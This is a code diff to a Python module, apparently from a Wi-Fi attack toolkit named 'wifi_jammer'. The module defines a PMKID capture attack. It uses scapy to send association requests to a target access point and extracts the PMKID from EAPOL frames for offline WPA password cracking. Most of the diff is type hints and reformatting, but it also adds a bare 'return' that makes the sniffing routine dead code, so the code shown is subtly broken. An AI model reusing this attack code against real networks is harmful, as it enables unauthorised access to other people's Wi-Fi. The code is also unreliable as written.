@@ -5,12 +5,16 @@ Captures WPA PMKID from APs via association requests.
 
 import threading
 import time
-from typing import Optional, List, Dict
+from typing import Optional, List, Dict, TYPE_CHECKING
 
-from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11AssoReq
+if TYPE_CHECKING:
+    from scapy.packet import Packet
+    from wifi_jammer.utils.logger import RichLogger
+
+from scapy.sendrecv import sniff
+from scapy.utils import wrpcap
+from scapy.layers.dot11 import Dot11, Dot11AssoReq, RadioTap
 from scapy.layers.eap import EAPOL
-
 from wifi_jammer.attacks.base_attack import BaseAttack
 from wifi_jammer.core.interfaces import AttackConfig
 
@@ -18,15 +22,15 @@ from wifi_jammer.core.interfaces import AttackConfig
 class PmkidCaptureAttack(BaseAttack):
     """Captures WPA PMKID from APs by sending association requests."""
 
-    def __init__(self, logger=None):
+    def __init__(self, logger: Optional["RichLogger"] = None) -> None:
         super().__init__(logger)
-        self._capture_file = ""
+        self._capture_file: str = ""
         self._captured_pmkids: List[Dict[str, str]] = []
         self._capture_thread: Optional[threading.Thread] = None
 
-    def _create_packet(self) -> Optional[Packet]:
+    def _create_packet(self) -> Optional["Packet"]:
         """Create association request packet to trigger PMKID."""
-        if not self._config.target_bssid:
+        if not self._config or not self._config.target_bssid:
             self.logger.warning("No target BSSID specified for PMKID capture")
             return None
 
@@ -34,13 +38,13 @@ class PmkidCaptureAttack(BaseAttack):
             src_mac = self._get_source_mac()
 
             packet = (
-                RadioTap() /
-                Dot11(
+                RadioTap()
+                / Dot11(
                     addr1=self._config.target_bssid,
                     addr2=src_mac,
                     addr3=self._config.target_bssid,
-                ) /
-                Dot11AssoReq()
+                )
+                / Dot11AssoReq()
             )
 
             return packet
@@ -49,8 +53,11 @@ class PmkidCaptureAttack(BaseAttack):
             self.logger.error(f"Failed to create association request: {e}")
             return None
 
-    def _sniff_packets(self):
+    def _sniff_packets(self) -> None:
         """Sniff EAPOL packets and extract PMKID."""
+        if not self._config:
+            return
+        return
         bpf_filter = f"ether src {self._config.target_bssid} and eapol"
 
         while self._running:
@@ -72,7 +79,9 @@ class PmkidCaptureAttack(BaseAttack):
                         entry = {
                             "pmkid": pmkid,
                             "ap_mac": self._config.target_bssid,
-                            "client_mac": pkt[Dot11].addr1 if pkt.haslayer(Dot11) else "",
+                            "client_mac": (
+                                pkt[Dot11].addr1 if pkt.haslayer(Dot11) else ""
+                            ),
                             "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                         }
                         self._captured_pmkids.append(entry)
@@ -87,14 +96,13 @@ class PmkidCaptureAttack(BaseAttack):
                     time.sleep(1)
 
     @staticmethod
-    def _extract_pmkid(pkt) -> Optional[str]:
-        """Extract PMKID from an EAPOL packet's RSN IE."""
+    def _extract_pmkid(pkt: "Packet") -> Optional[str]:
         try:
             raw_bytes = bytes(pkt[EAPOL].payload)
 
             for i in range(len(raw_bytes) - 20):
                 if raw_bytes[i] == 0x30 and raw_bytes[i + 1] >= 20:
-                    rsn_data = raw_bytes[i + 2:]
+                    rsn_data = raw_bytes[i + 2 :]
                     pmkid_count = rsn_data[14] if len(rsn_data) > 14 else 0
                     if pmkid_count > 0 and len(rsn_data) >= 20:
                         pmkid = rsn_data[16:32].hex()
